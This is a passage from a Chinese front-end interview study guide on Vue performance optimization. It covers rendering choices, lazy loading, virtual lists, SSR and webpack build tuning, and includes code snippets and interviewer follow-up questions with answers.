面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>首页接口只返回少量数据，但首次打开仍要下载很大的脚本包，团队却只准备优化组件渲染，你会指出什么偏差？</strong></p>\\n<p>首屏时间同时受资源加载和页面渲染影响，只优化组件渲染可能绕过真正瓶颈。应先根据加载瀑布、资源体积和主线程执行情况判断属于哪一类，再选择拆包、延迟加载或减少渲染工作的措施。</p>\\n</li>\\n<li>\\n<p><strong>新闻首页只有首屏文章需要立即展示，评论区和相关推荐位于页面下方，你会怎样安排加载与渲染？</strong></p>\\n<p>首屏必需的内容和资源应优先加载，下方评论与推荐可在用户接近或需要时再加载并渲染。这样同时减少初始网络请求和首轮节点创建；延迟过度会让用户滚动后看到明显等待，需要设置合理的提前量。</p>\\n</li>\\n<li>\\n<p><strong>弱网用户首屏慢，而开发机刷新很快，资源负责人认为无需改包，页面负责人认为全是渲染问题，你怎么定位？</strong></p>\\n<p>应分别观察资源下载阶段与下载后的解析、执行和渲染阶段，不能用开发机体验直接归因。若时间主要耗在网络和大资源上，优先做资源加载优化；若资源已就绪但页面迟迟不可见，再检查首轮渲染量和同步任务。</p>\\n</li>\\n<li>\\n<p><strong>路由已经做了懒加载，首屏资源仍然偏大，你会沿着哪些入口继续排查？</strong></p>\\n<p>检查入口文件中的全局注册、静态导入和公共依赖是否仍被打进首屏资源，并结合构建产物分析实际组成。只把路由组件改成动态加载不保证其依赖都延后；拆分过细又会增加请求与运行时调度成本。</p>\\n</li>\\n<li>\\n<p><strong>性能评审要求在“继续拆资源”和“减少首屏组件”之间二选一，你会依据什么做决定？</strong></p>\\n<p>依据瓶颈所在阶段选择：下载和加载占主导就先优化资源，脚本执行、节点创建或更新占主导就先缩减页面渲染。两类方案并非互斥，但应按项目实际数据排序；没有测量便同时改动，会难以判断收益和回归来源。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_63-vue中常见性能优化\\"><a class=\\"header-anchor\\" href=\\"#_63-vue中常见性能优化\\">#</a> 63 Vue中常见性能优化</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>编码层：<code>v-for</code> 用稳定 <code>key</code>、<code>v-if</code>/<code>v-show</code> 按切换频率选、<code>computed</code> 缓存重计算、避免 <code>v-if</code> 与 <code>v-for</code> 同元素</li>\\n<li>数据层：纯展示大数据用 <code>Object.freeze</code>/<code>shallowRef</code> 跳过深度劫持、别把超大对象塞进 <code>data</code></li>\\n<li>渲染层：长列表虚拟滚动、大组件拆小让更新局部化、<code>v-once</code>/<code>v-memo</code> 跳过静态部分</li>\\n<li>加载层：路由和组件懒加载、<code>CDN</code>、按需引入组件库、<code>bundle-analyzer</code> 找体积大头</li>\\n<li>销毁层：定时器/监听/连接必须清理 —— 泄漏在 <code>SPA</code> 里会累积成&quot;越用越卡&quot;</li>\\n</ul>\\n<p><strong><code>Vue</code> 性能优化要从渲染、资源加载、构建和运行时清理几方面入手，并先用 <code>Chrome Performance</code> 或构建分析工具定位瓶颈。</strong> 渲染上可合理选择 <code>v-if</code>、<code>v-show</code> 和 <code>computed</code>，列表设置稳定的 <code>key</code>，长列表使用虚拟滚动。首屏可通过路由懒加载、异步组件、图片懒加载和按需引入减小加载量，频繁切换的页面则可用 <code>keep-alive</code>。组件销毁时还要手动清理定时器及全局事件；若首屏或 <code>SEO</code> 是关键指标，再考虑预渲染或 <code>SSR</code>。</p>\\n</section>\\n<p><strong>Vue性能优化方式</strong></p>\\n<ul>\\n<li>合理使用<code>v-show</code>和<code>v-if</code></li>\\n<li>合理使用<code>computed</code></li>\\n<li><code>v-for</code>时添加<code>key</code>，以及避免和<code>v-if</code>同时使用</li>\\n<li>自定义事件、<code>DOM</code>事件及时销毁</li>\\n<li>合理使用异步组件，加载大组件</li>\\n<li>合理使用<code>keep-alive</code>避免频繁重复渲染</li>\\n<li><code>data</code>层级不要太深，避免递归性能不好</li>\\n<li>使用<code>vue-loader</code>在开发环境做模板编译(预编译)</li>\\n<li><code>webpack</code>层级优化</li>\\n<li>前端通用性能优化，如图片懒加载</li>\\n<li>使用<code>SSR</code></li>\\n</ul>\\n<p><strong>编码优化</strong>：</p>\\n<ol>\\n<li><strong>使用<code>v-show</code>复用<code>DOM</code></strong>：避免重复创建组件</li>\\n</ol>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n  &lt;div class=&quot;cell&quot;&gt;\\n    &lt;!-- 这种情况用v-show复用DOM，比v-if效果好 --&gt;\\n    &lt;div v-show=&quot;value&quot; class=&quot;on&quot;&gt;\\n      &lt;Heavy :n=&quot;10000&quot;/&gt;\\n    &lt;/div&gt;\\n    &lt;section v-show=&quot;!value&quot; class=&quot;off&quot;&gt;\\n      &lt;Heavy :n=&quot;10000&quot;/&gt;\\n    &lt;/section&gt;\\n  &lt;/div&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<ol start=\\"2\\">\\n<li><strong>合理使用路由懒加载、异步组件</strong>，有效拆分<code>App</code>尺寸，访问时才异步加载</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>const router = createRouter({\\n  routes: [\\n    // 借助webpack的import()实现异步组件\\n    { path: &#39;/foo&#39;, component: () =&gt; import(&#39;./Foo.vue&#39;) }\\n  ]\\n})\\n</code></pre>\\n<ol start=\\"3\\">\\n<li><strong><code>keep-alive</code>缓存页面</strong>：避免重复创建组件实例，且能保留缓存组件状态</li>\\n</ol>\\n<pre class=\\"language-html\\"><code>&lt;router-view v-slot=&quot;{ Component }&quot;&gt;\\n    &lt;keep-alive&gt;\\n    &lt;component :is=&quot;Component&quot;&gt;&lt;/component&gt;\\n  &lt;/keep-alive&gt;\\n&lt;/router-view&gt;\\n</code></pre>\\n<ol start=\\"4\\">\\n<li><strong><code>v-once</code>和<code>v-memo</code>：不再变化的数据使用<code>v-once</code></strong></li>\\n</ol>\\n<pre class=\\"language-html\\"><code>&lt;!-- single element --&gt;\\n&lt;span v-once&gt;This will never change: {{msg}}&lt;/span&gt;\\n&lt;!-- the element have children --&gt;\\n&lt;div v-once&gt;\\n  &lt;h1&gt;comment&lt;/h1&gt;\\n  &lt;p&gt;{{msg}}&lt;/p&gt;\\n&lt;/div&gt;\\n&lt;!-- component --&gt;\\n&lt;my-component v-once :comment=&quot;msg&quot;&gt;&lt;/my-component&gt;\\n&lt;!-- `v-for` directive --&gt;\\n&lt;ul&gt;\\n  &lt;li v-for=&quot;i in list&quot; v-once&gt;{{i}}&lt;/li&gt;\\n&lt;/ul&gt;\\n</code></pre>\\n<p>按条件跳过更新时使用<code>v-momo</code>：下面这个列表只会更新选中状态变化项</p>\\n<pre class=\\"language-html\\"><code>&lt;div v-for=&quot;item in list&quot; :key=&quot;item.id&quot; v-memo=&quot;[item.id === selected]&quot;&gt;\\n  &lt;p&gt;ID: {{ item.id }} - selected: {{ item.id === selected }}&lt;/p&gt;\\n  &lt;p&gt;...more child nodes&lt;/p&gt;\\n&lt;/div&gt;\\n</code></pre>\\n<ol start=\\"5\\">\\n<li><strong>长列表性能优化</strong>：如果是大数据长列表，可采用虚拟滚动，只渲染少部分区域的内容</li>\\n</ol>\\n<pre class=\\"language-html\\"><code>&lt;recycle-scroller\\n  class=&quot;items&quot;\\n  :items=&quot;items&quot;\\n  :item-size=&quot;24&quot;\\n&gt;\\n  &lt;template v-slot=&quot;{ item }&quot;&gt;\\n    &lt;FetchItemView\\n      :item=&quot;item&quot;\\n      @vote=&quot;voteItem(item)&quot;\\n    /&gt;\\n  &lt;/template&gt;\\n&lt;/recycle-scroller&gt;\\n</code></pre>\\n<ol start=\\"6\\">\\n<li>防止内部泄漏，<strong>组件销毁后把全局变量和事件销毁</strong>：<code>Vue</code> 组件销毁时，会自动解绑它的全部指令及事件监听器，但是仅限于组件本身的事件</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>export default {\\n  created() {\\n    this.timer = setInterval(this.refresh, 2000)\\n  },\\n  beforeUnmount() {\\n    clearInterval(this.timer)\\n  }\\n}\\n</code></pre>\\n<ol start=\\"7\\">\\n<li><strong>图片懒加载</strong></li>\\n</ol>\\n<p>对于图片过多的页面，为了加速页面加载速度，所以很多时候我们需要将页面内未出现在可视区域内的图片先不做加载，等到滚动到可视区域后再去加载</p>\\n<pre class=\\"language-html\\"><code>&lt;!-- 参考 https://github.com/hilongjw/vue-lazyload --&gt;\\n&lt;img v-lazy=&quot;/static/img/1.png&quot;&gt;\\n</code></pre>\\n<ol start=\\"8\\">\\n<li><strong>滚动到可视区域动态加载</strong></li>\\n</ol>\\n<p><a href=\\"https://tangbc.github.io/vue-virtual-scroll-list\\">https://tangbc.github.io/vue-virtual-scroll-list</a></p>\\n<ol start=\\"9\\">\\n<li><strong>第三方插件按需引入：（<code>babel-plugin-component</code>）</strong></li>\\n</ol>\\n<p>像<code>element-plus</code>这样的第三方组件库可以按需引入避免体积太大</p>\\n<pre class=\\"language-js\\"><code>import { createApp } from &#39;vue&#39;;\\nimport { Button, Select } from &#39;element-plus&#39;;\\n​\\nconst app = createApp()\\napp.use(Button)\\napp.use(Select)\\n</code></pre>\\n<ol start=\\"10\\">\\n<li><strong>服务端渲染：<code>SSR</code></strong></li>\\n</ol>\\n<p>如果<code>SPA</code>应用有首屏渲染慢的问题，可以考虑<code>SSR</code></p>\\n<p><strong>以及下面的其他方法</strong></p>\\n<ul>\\n<li>不要将所有的数据都放在<code>data</code>中，<code>data</code>中的数据都会增加<code>getter</code>和<code>setter</code>，会收集对应的<code>watcher</code></li>\\n<li><code>v-for</code> 遍历为 <code>item</code> 添加 <code>key</code></li>\\n<li><code>v-for</code> 遍历避免同时使用 <code>v-if</code></li>\\n<li>区分 <code>computed</code> 和 <code>watch</code> 的使用</li>\\n<li>拆分组件(提高复用性、增加代码的可维护性,减少不必要的渲染 )</li>\\n<li>防抖、节流</li>\\n</ul>\\n<p><strong>用户体验</strong></p>\\n<ul>\\n<li><code>app-skeleton</code> 骨架屏</li>\\n<li><code>pwa</code> <code>serviceworker</code></li>\\n</ul>\\n<p><strong>SEO优化</strong></p>\\n<ul>\\n<li>预渲染插件 <code>prerender-spa-plugin</code></li>\\n<li>服务端渲染 <code>ssr</code></li>\\n</ul>\\n<p><strong>打包优化</strong></p>\\n<ul>\\n<li><code>Webpack</code> 对图片进行压缩</li>\\n<li>使用 <code>cdn</code> 的方式加载第三方模块</li>\\n<li>多线程打包 <code>happypack</code></li>\\n<li><code>splitChunks</code> 抽离公共文件</li>\\n<li>优化 <code>SourceMap</code></li>\\n<li>构建结果输出分析，利用 <code>webpack-bundle-analyzer</code> 可视化分析工具</li>\\n</ul>\\n<p><strong>基础的 Web 技术的优化</strong></p>\\n<ul>\\n<li>服务端 <code>gzip</code> 压缩</li>\\n<li>浏览器缓存</li>\\n<li><code>CDN</code> 的使用</li>\\n<li>使用 <code>Chrome Performance</code> 查找性能瓶颈</li>\\n</ul>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>商品详情页的规格面板只偶尔展开，开发者却用 <code>v-show</code> 常驻一个包含大量子节点的重组件；<code>v-show</code> 一定比 <code>v-if</code> 快吗？</strong></p>\\n<p>不一定，低频展示的重组件更适合用 <code>v-if</code>，避免首次进入页面就完成创建和渲染。<code>v-show</code> 只切换显示状态，适合频繁开关且创建成本高的内容；它用初始渲染和常驻内存换取后续切换速度。</p>\\n</li>\\n<li>\\n<p><strong>一个后台首页首包包含报表、富文本编辑器和审批表单，但用户本次只会进入其中一个模块，你会怎样调整组件加载方式？</strong></p>\\n<p>把路由页面和体积较大的功能组件改为 <code>() =&gt; import(\'./Module.vue\')</code>，让构建工具拆分代码并在访问时加载。这样能降低初始化阶段不必要的下载与解析，但模块首次打开会产生异步等待，通常还要配合加载态或骨架屏。</p>\\n</li>\\n<li>\\n<p><strong>客服系统在多个工单间切换时要保留表单草稿，团队准备给全部路由统一套上 <code>keep-alive</code>，这个方案有什么边界？</strong></p>\\n<p>只缓存需要保留状态且会频繁往返的页面，不应无差别缓存所有路由组件。<code>keep-alive</code> 能避免重复创建实例并保留组件状态，但缓存范围过大会持续占用内存，还要明确哪些页面需要失效或重新获取数据。</p>\\n</li>\\n<li>\\n<p><strong>监控发现离开实时看板后请求仍每两秒触发一次，组件已经卸载，你会沿着什么路径排查？</strong></p>\\n<p>优先检查组件创建阶段注册的 <code>setInterval</code>、全局对象和组件外部事件监听，并在 <code>beforeUnmount</code> 中执行对应清理。<code>Vue</code> 只会自动解绑组件自身管理的指令和监听器，外部副作用不会自动消失；遗漏清理会造成后台任务累积和内存泄漏。</p>\\n</li>\\n<li>\\n<p><strong>运营页要展示五万条商品记录，产品要求保留顺畅滚动；你会选分页、普通 <code>v-for</code> 还是虚拟滚动？</strong></p>\\n<p>需要连续浏览大量记录时优先考虑虚拟滚动，只渲染可视区域附近的少量节点，而不是让五万项同时进入 <code>DOM</code>。若业务允许分段查看，分页实现更简单；虚拟滚动则要处理固定或可测量行高、滚动定位及组件状态复用等额外复杂度。</p>\\n</li>\\n<li>\\n<p><strong>长列表中只有选中项样式会变化，团队已经设置稳定 <code>key</code>，还需要怎样减少其余行的更新？</strong></p>\\n<p>稳定 <code>key</code> 只解决节点身份识别，不能保证未变化的子树跳过更新。<code>Vue</code> 3 中可在列表项上使用 <code>v-memo=&quot;[item.id === selected]&quot;</code>，让依赖条件未变的行复用上次结果；若行内容还有其他动态依赖，必须一并纳入条件，否则界面可能停留在旧状态。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_64-vue项目性能优化-详细\\"><a class=\\"header-anchor\\" href=\\"#_64-vue项目性能优化-详细\\">#</a> 64 Vue项目性能优化-详细</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>这是上一题的展开版，核心结构一致：<strong>编码 / 数据 / 渲染 / 加载 / 销毁</strong>五层</li>\\n<li>面试时不要平铺所有条目 —— 挑两三条能说出&quot;具体场景 + 改动 + 数字&quot;的展开，比背二十条有说服力</li>\\n<li>一定要强调<strong>先量后改</strong>：<code>Performance</code> 面板、<code>Coverage</code>、<code>bundle-analyzer</code>、线上 <code>Web Vitals</code> 的 <code>P75</code></li>\\n<li>要能说出&quot;优化用错位置反而变慢&quot;的例子（首屏图懒加载拖垮 <code>LCP</code>、无差别 <code>will-change</code> 吃显存）</li>\\n<li>收尾落到工程制度：性能预算（<code>bundle</code> 体积阈值进 <code>CI</code>）、线上监控告警，而不是一次性专项</li>\\n</ul>\\n<p><strong><code>Vue</code> 项目优化不能只改组件代码，还要同时处理渲染开销、打包体积、资源传输和首屏策略。</strong> 代码层面我会优先检查 <code>v-if</code> 与 <code>v-show</code> 的场景、列表的 <code>key</code>、全局事件清理，并让长列表采用虚拟滚动。构建和传输层面可做路由拆包、组件库按需引入、公共代码抽取、图片压缩、缓存、<code>CDN</code> 与 <code>gzip</code>。如果问题集中在首屏和 <code>SEO</code>，可权衡 <code>SSR</code> 或预渲染；具体是否有效，应通过 <code>Chrome Performance</code> 和 <code>webpack-bundle-analyzer</code> 验证。</p>\\n</section>\\n<blockquote>\\n<p><code>Vue</code> 框架通过数据双向绑定和虚拟 <code>DOM</code> 技术，帮我们处理了前端开发中最脏最累的 <code>DOM</code> 操作部分， 我们不再需要去考虑如何操作 <code>DOM</code> 以及如何最高效地操作 <code>DOM</code>；但 <code>Vue</code> 项目中仍然存在项目首屏优化、<code>Webpack</code> 编译配置优化等问题，所以我们仍然需要去关注 <code>Vue</code> 项目性能方面的优化，使项目具有更高效的性能、更好的用户体验</p>\\n</blockquote>\\n<h3 id=\\"代码层面的优化\\"><a class=\\"header-anchor\\" href=\\"#代码层面的优化\\">#</a> 代码层面的优化</h3>\\n<p><strong>1. v-if 和 v-show 区分使用场景</strong></p>\\n<ul>\\n<li><code>v-if</code> 是 真正 的条件渲染，因为它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建；也是惰性的：如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染条件块</li>\\n<li><code>v-show</code> 就简单得多， 不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 <code>CSS</code> <code>display</code>的<code>none/block</code>属性进行切换。</li>\\n<li>所以，<code>v-if</code> 适用于在运行时很少改变条件，不需要频繁切换条件的场景；<code>v-show</code> 则适用于需要非常频繁切换条件的场景</li>\\n</ul>\\n<p><strong>2. computed 和 watch 区分使用场景</strong></p>\\n<ul>\\n<li><code>computed</code>： 是计算属性，依赖其它属性值，并且 <code>computed</code> 的值有缓存，只有它依赖的属性值发生改变，下一次获取 <code>computed</code> 的值时才会重新计算 computed  的值；</li>\\n<li><code>watch</code>： 更多的是「观察」的作用，类似于某些数据的监听回调 ，每当监听的数据变化时都会执行回调进行后续操作</li>\\n</ul>\\n<p><strong>运用场景：</strong></p>\\n<ul>\\n<li>当我们需要进行数值计算，并且依赖于其它数据时，应该使用 <code>computed</code>，因为可以利用 <code>computed</code> 的缓存特性，避免每次获取值时，都要重新计算；</li>\\n<li>当我们需要在数据变化时执行异步或开销较大的操作时，应该使用 <code>watch</code>，使用 <code>watch</code> 选项允许我们执行异步操作 ( 访问一个 <code>API</code> )，限制我们执行该操作的频率，并在我们得到最终结果前，设置中间状态。这些都是计算属性无法做到的</li>\\n</ul>\\n<p><strong>3. v-for 遍历必须为 item 添加 key，且避免同时使用 v-if</strong></p>\\n<ul>\\n<li><code>v-for</code> 遍历必须为 <code>item</code> 添加 <code>key</code>\\n<ul>\\n<li>在列表数据进行遍历渲染时，需要为每一项 <code>item</code> 设置唯一 <code>key</code> 值，方便 <code>Vue.js</code> 内部机制精准找到该条列表数据。当 <code>state</code> 更新时，新的状态值和旧的状态值对比，较快地定位到 <code>diff</code></li>\\n</ul>\\n</li>\\n<li><code>v-for</code> 遍历避免同时使用 <code>v-if</code>\\n<ul>\\n<li><code>vue2.x</code>中<code>v-for</code> 比 <code>v-if</code> 优先级高，如果每一次都需要遍历整个数组，将会影响速度，尤其是当之需要渲染很小一部分的时候，必要情况下应该替换成 <code>computed</code> 属性</li>\\n</ul>\\n</li>\\n</ul>\\n<p>推荐：</p>\\n<pre class=\\"language-text\\"><code>&lt;ul&gt;\\n  &lt;li\\n    v-for=&quot;user in activeUsers&quot;\\n    :key=&quot;user.id&quot;&gt;\\n    {{ user.name }}\\n  &lt;/li&gt;\\n&lt;/ul&gt;\\ncomputed: {\\n  activeUsers: function () {\\n    return this.users.filter(function (user) {\\n\\t return user.isActive\\n    })\\n  }\\n}\\n</code></pre>\\n<p>不推荐：</p>\\n<pre class=\\"language-html\\"><code>&lt;ul&gt;\\n  &lt;li\\n    v-for=&quot;user in users&quot;\\n    v-if=&quot;user.isActive&quot;\\n    :key=&quot;user.id&quot;&gt;\\n    {{ user.name }}\\n  &lt;/li&gt;\\n&lt;/ul&gt;\\n</code></pre>\\n<p><strong>4. 长列表性能优化</strong></p>\\n<blockquote>\\n<p><code>Vue</code> 会通过 <code>Object.defineProperty</code> 对数据进行劫持，来实现视图响应数据的变化，然而有些时候我们的组件就是纯粹的数据展示，不会有任何改变，我们就不需要 Vue 来劫持我们的数据，在大量数据展示的情况下，这能够很明显的减少组件初始化的时间，那如何禁止 <code>Vue</code> 劫持我们的数据呢？可以通过 <code>Object.freeze</code> 方法来冻结一个对象，一旦被冻结的对象就再也不能被修改了</p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>export default {\\n  data: () =&gt; ({\\n    users: {}\\n  }),\\n  async created() {\\n    const users = await axios.get(&quot;/api/users&quot;);\\n    this.users = Object.freeze(users);\\n  }\\n};\\n</code></pre>\\n<p><strong>5. 事件的销毁</strong></p>\\n<p><code>Vue</code> 组件销毁时，会自动清理它与其它实例的连接，解绑它的全部指令及事件监听器，但是仅限于组件本身的事件。 如果在 <code>js</code> 内使用 <code>addEventListener</code> 等方式是不会自动销毁的，我们需要在组件销毁时手动移除这些事件的监听，以免造成内存泄露，如：</p>\\n<pre class=\\"language-js\\"><code>created() {\\n  addEventListener(&#39;click&#39;, this.click, false)\\n},\\nbeforeDestroy() {\\n  removeEventListener(&#39;click&#39;, this.click, false)\\n}\\n</code></pre>\\n<p><strong>6. 图片资源懒加载</strong></p>\\n<p>对于图片过多的页面，为了加速页面加载速度，所以很多时候我们需要将页面内未出现在可视区域内的图片先不做加载， 等到滚动到可视区域后再去加载。这样对于页面加载性能上会有很大的提升，也提高了用户体验。我们在项目中使用 <code>Vue</code> 的 <code>vue-lazyload</code> 插件</p>\\n<pre class=\\"language-text\\"><code>npm install vue-lazyload --save-dev\\n</code></pre>\\n<p>在入口文件 <code>man.js</code> 中引入并使用</p>\\n<pre class=\\"language-js\\"><code>import VueLazyload from &#39;vue-lazyload&#39;\\n\\nVue.use(VueLazyload)\\n\\n// 或者添加自定义选项\\nVue.use(VueLazyload, {\\n  preLoad: 1.3,\\n  error: &#39;dist/error.png&#39;,\\n  loading: &#39;dist/loading.gif&#39;,\\n  attempt: 1\\n})\\n</code></pre>\\n<p>在 <code>vue</code> 文件中将 <code>img</code> 标签的 <code>src</code> 属性直接改为 <code>v-lazy</code> ，从而将图片显示方式更改为懒加载显示</p>\\n<pre class=\\"language-html\\"><code>&lt;img v-lazy=&quot;/static/img/1.png&quot;&gt;\\n</code></pre>\\n<p>以上为 <code>vue-lazyload</code> 插件的简单使用，如果要看插件的更多参数选项，可以查看 <a href=\\"https://github.com/hilongjw/vue-lazyload\\">vue-lazyload 的 github 地址</a></p>\\n<p><strong>7. 路由懒加载</strong></p>\\n<p>Vue 是单页面应用，可能会有很多的路由引入 ，这样使用 <code>webpcak</code> 打包后的文件很大，当进入首页时，加载的资源过多，页面会出现白屏的情况，不利于用户体验。如果我们能把不同路由对应的组件分割成不同的代码块，然后当路由被访问的时候才加载对应的组件，这样就更加高效了。这样会大大提高首屏显示的速度，但是可能其他的页面的速度就会降下来</p>\\n<p>路由懒加载：</p>\\n<pre class=\\"language-js\\"><code>const Foo = () =&gt; import(&#39;./Foo.vue&#39;)\\nconst router = new VueRouter({\\n  routes: [\\n    { path: &#39;/foo&#39;, component: Foo }\\n  ]\\n})\\n</code></pre>\\n<p><strong>8. 第三方插件的按需引入</strong></p>\\n<p>我们在项目中经常会需要引入第三方插件，如果我们直接引入整个插件，会导致项目的体积太大，我们可以借助 <code>babel-plugin-component</code> ，然后可以只引入需要的组件，以达到减小项目体积的目的。以下为项目中引入 <code>element-ui</code> 组件库为例</p>\\n<pre class=\\"language-text\\"><code>npm install babel-plugin-component -D\\n</code></pre>\\n<p>将 <code>.babelrc</code> 修改为：</p>\\n<pre class=\\"language-json\\"><code>{\\n  &quot;presets&quot;: [[&quot;es2015&quot;, { &quot;modules&quot;: false }]],\\n  &quot;plugins&quot;: [\\n    [\\n      &quot;component&quot;,\\n      {\\n        &quot;libraryName&quot;: &quot;element-ui&quot;,\\n        &quot;styleLibraryName&quot;: &quot;theme-chalk&quot;\\n      }\\n    ]\\n  ]\\n}\\n</code></pre>\\n<p>在 <code>main.js</code> 中引入部分组件：</p>\\n<pre class=\\"language-js\\"><code>import Vue from &#39;vue&#39;;\\nimport { Button, Select } from &#39;element-ui&#39;;\\n\\nVue.use(Button)\\nVue.use(Select)\\n</code></pre>\\n<p><strong>9. 优化无限列表性能</strong></p>\\n<p>如果你的应用存在非常长或者无限滚动的列表，那么需要采用<code>虚拟列表</code>的技术来优化性能，只需要渲染少部分区域的内容，减少重新渲染组件和创建 <code>dom</code> 节点的时间。 你可以参考以下开源项目 <a href=\\"https://github.com/tangbc/vue-virtual-scroll-list\\">vue-virtual-scroll-list</a> 和 <a href=\\"https://github.com/Akryum/vue-virtual-scroller\\">vue-virtual-scroller</a> 来优化这种无限列表的场景的</p>\\n<p><strong>10. 服务端渲染 SSR or 预渲染</strong></p>\\n<p>服务端渲染是指 <code>Vue</code> 在客户端将标签渲染成的整个 <code>html</code> 片段的工作在服务端完成，服务端形成的 <code>html</code> 片段直接返回给客户端这个过程就叫做服务端渲染。</p>\\n<ul>\\n<li>如果你的项目的 <code>SEO</code> 和 <code>首屏渲染</code>是评价项目的关键指标，那么你的项目就需要服务端渲染来帮助你实现最佳的初始加载性能和 <code>SEO</code></li>\\n<li>如果你的 <code>Vue</code> 项目只需改善少数营销页面（例如  <code>/</code>， <code>/about</code>， <code>/contact</code> 等）的 <code>SEO</code>，那么你可能需要预渲染，在构建时简单地生成针对特定路由的静态 <code>HTML</code> 文件。<strong>优点是设置预渲染更简单</strong>，并可以将你的前端作为一个完全静态的站点，具体你可以使用 <a href=\\"https://github.com/chrisvfritz/prerender-spa-plugin\\">prerender-spa-plugin</a> 就可以轻松地添加预渲染</li>\\n</ul>\\n<h3 id=\\"webpack-层面的优化\\"><a class=\\"header-anchor\\" href=\\"#webpack-层面的优化\\">#</a> Webpack 层面的优化</h3>\\n<p><strong>1. Webpack 对图片进行压缩</strong></p>\\n<p>对小于 <code>limit</code> 的图片转化为 <code>base64</code> 格式，其余的不做操作。所以对有些较大的图片资源，在请求资源的时候，加载会很慢，我们可以用 <code>image-webpack-loader</code>来压缩图片</p>\\n<pre class=\\"language-text\\"><code>npm install image-webpack-loader --save-dev\\n</code></pre>\\n<pre class=\\"language-json\\"><code>{\\n  test: /\\\\.(png|jpe?g|gif|svg)(\\\\?.*)?$/,\\n  use:[\\n    {\\n    loader: &#39;url-loader&#39;,\\n    options: {\\n      limit: 10000,\\n      name: utils.assetsPath(&#39;img/[name].[hash:7].[ext]&#39;)\\n      }\\n    },\\n    {\\n      loader: &#39;image-webpack-loader&#39;,\\n      options: {\\n        bypassOnDebug: true,\\n      }\\n    }\\n  ]\\n}\\n</code></pre>\\n<p><strong>2. 减少 ES6 转为 ES5 的冗余代码</strong></p>\\n<p>Babel 插件会在将 ES6 代码转换成 ES5 代码时会注入一些辅助函数，例如下面的 ES6 代码</p>\\n<pre class=\\"language-js\\"><code>class HelloWebpack extends Component{...}\\n</code></pre>\\n<p>这段代码再被转换成能正常运行的 ES5 代码时需要以下两个辅助函数：</p>\\n<pre class=\\"language-js\\"><code>babel-runtime/helpers/createClass  // 用于实现 class 语法\\nbabel-runtime/helpers/inherits  // 用于实现 extends 语法    \\n</code></pre>\\n<p>在默认情况下， <code>Babel</code> 会在每个输出文件中内嵌这些依赖的辅助函数代码，如果多个源代码文件都依赖这些辅助函数，那么这些辅助函数的代码将会出现很多次，造成代码冗余。为了不让这些辅助函数的代码重复出现，可以在依赖它们时通过 <code>require(\'babel-runtime/helpers/createClass\')</code> 的方式导入，这样就能做到只让它们出现一次。<code>babel-plugin-transform-runtime</code> 插件就是用来实现这个作用的，将相关辅助函数进行替换成导入语句，从而减小 babel 编译出来的代码的文件大小</p>\\n<pre class=\\"language-js\\"><code>npm install babel-plugin-transform-runtime --save-dev\\n</code></pre>\\n<p>修改 <code>.babelrc</code> 配置文件为：</p>\\n<pre class=\\"language-json\\"><code>&quot;plugins&quot;: [\\n    &quot;transform-runtime&quot;\\n]\\n</code></pre>\\n<p><strong>3. 提取公共代码</strong></p>\\n<p>如果项目中没有去将每个页面的第三方库和公共模块提取出来，则项目会存在以下问题：</p>\\n<ul>\\n<li>相同的资源被重复加载，浪费用户的流量和服务器的成本。</li>\\n<li>每个页面需要加载的资源太大，导致网页首屏加载缓慢，影响用户体验。</li>\\n</ul>\\n<p>所以我们需要将多个页面的公共代码抽离成单独的文件，来优化以上问题 。<code>Webpack</code> 内置了专门用于提取多个<code>Chunk</code> 中的公共部分的插件 <code>CommonsChunkPlugin</code>，我们在项目中 <code>CommonsChunkPlugin</code> 的配置如下：</p>\\n<pre class=\\"language-js\\"><code>// 所有在 package.json 里面依赖的包，都会被打包进 vendor.js 这个文件中。\\nnew webpack.optimize.CommonsChunkPlugin({\\n  name: &#39;vendor&#39;,\\n  minChunks: function(module, count) {\\n    return (\\n      module.resource &amp;&amp;\\n      /\\\\.js$/.test(module.resource) &amp;&amp;\\n      module.resource.indexOf(\\n        path.join(__dirname, &#39;../node_modules&#39;)\\n      ) === 0\\n    );\\n  }\\n}),\\n// 抽取出代码模块的映射关系\\nnew webpack.optimize.CommonsChunkPlugin({\\n  name: &#39;manifest&#39;,\\n  chunks: [&#39;vendor&#39;]\\n})\\n</code></pre>\\n<p><strong>4. 模板预编译</strong></p>\\n<ul>\\n<li>当使用 DOM 内模板或 JavaScript 内的字符串模板时，模板会在运行时被编译为渲染函数。通常情况下这个过程已经足够快了，但对性能敏感的应用还是最好避免这种用法。</li>\\n<li>预编译模板最简单的方式就是使用单文件组件——相关的构建设置会自动把预编译处理好，所以构建好的代码已经包含了编译出来的渲染函数而不是原始的模板字符串。</li>\\n<li>如果你使用 webpack，并且喜欢分离 JavaScript 和模板文件，你可以使用 <a href=\\"https://github.com/ktsn/vue-template-loader\\">vue-template-loader</a>，它也可以在构建过程中把模板文件转换成为 JavaScript 渲染函数</li>\\n</ul>\\n<p><strong>5. 提取组件的 CSS</strong></p>\\n<p>当使用单文件组件时，组件内的 CSS 会以 style 标签的方式通过 JavaScript 动态注入。这有一些小小的运行时开销，如果你使用服务端渲染，这会导致一段 “无样式内容闪烁 (fouc) ” 。将所有组件的 CSS 提取到同一个文件可以避免这个问题，也会让 CSS 更好地进行压缩和缓存</p>\\n<p><strong>6. 优化 SourceMap</strong></p>\\n<p>我们在项目进行打包后，会将开发中的多个文件代码打包到一个文件中，并且经过压缩、去掉多余的空格、babel编译化后，最终将编译得到的代码会用于线上环境，那么这样处理后的代码和源代码会有很大的差别，当有 bug的时候，我们只能定位到压缩处理后的代码位置，无法定位到开发环境中的代码，对于开发来说不好调式定位问题，因此 <code>sourceMap</code> 